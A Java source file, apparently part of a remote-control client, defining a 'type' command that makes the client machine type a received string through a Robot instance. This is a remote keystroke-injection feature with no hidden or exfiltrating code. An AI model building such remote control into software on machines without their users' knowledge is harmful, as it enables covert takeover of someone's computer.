package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:14
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ControlComponents;

public class ClientCommandKeyboardType extends ClientCommand {

    public ClientCommandKeyboardType() {
        super("type");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite algo para digitar!");
            return;
        }
        msg("Digitando " + input);
        new Thread(() -> ControlComponents.typeString(ControlComponents.ROBOT_INSTANCE, input)).start();
    }

}
